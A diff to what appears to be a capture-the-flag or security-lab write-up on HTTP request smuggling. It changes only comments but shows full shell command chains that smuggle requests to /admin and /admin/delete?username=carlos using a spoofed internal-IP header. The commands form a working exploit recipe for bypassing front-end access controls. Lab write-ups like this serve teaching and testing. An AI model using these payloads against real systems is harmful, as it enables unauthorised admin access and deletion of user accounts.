@@ -175,7 +175,7 @@ httpecho -s
 # Construct a POST request to /admin
 curl -s http://localhost:8888/admin -X GET --data "x=1" -H "Content-Length: 10" -H "Connection: close" -H 'User-Agent:'  -H 'Accept:' > admin
 cat admin | httpoverride -H "Host:" -H "$SECRET_HEADER: 127.0.0.1" > admin_modify
-# Adjust body to smuggle post_admin_modify request
+# Adjust body to smuggle /admin request
 printf "0\r\n\r\n$(cat admin_modify)" > payload
 curl -s -X POST http://localhost:8888/ --data-binary "@payload" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' | httpoverride --chunked > smuggle
 # Perform the request
@@ -184,14 +184,14 @@ cat smuggle | httpclient https://$LAB_URL
 
 #### Delete user
 
-Same thing as above, this time ask for `/admin/delete?username=carlos` endpoint
+Same thing as above, this time ask for `/admin/delete?username=carlos` endpoint:
 ```shell
 #Launch server
 httpecho -s
-# Construct a POST request to /admin to delete user
+# Construct a POST request to /admin/delete to delete user
 curl -s http://localhost:8888/admin/delete?username=carlos -X GET --data "x=1" -H "Content-Length: 10" -H "Connection: close" -H 'User-Agent:'  -H 'Accept:' > delete
 cat delete | httpoverride -H "Host:" -H "$SECRET_HEADER: 127.0.0.1" > delete_modify
-# Adjust body to smuggle post_admin_modify request
+# Adjust body to smuggle /admin/delete request
 printf "0\r\n\r\n$(cat delete_modify)" > delete_payload
 curl -s -X POST http://localhost:8888/ --data-binary "@delete_payload" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' | httpoverride --chunked > delete_smuggle
 # Perform the request
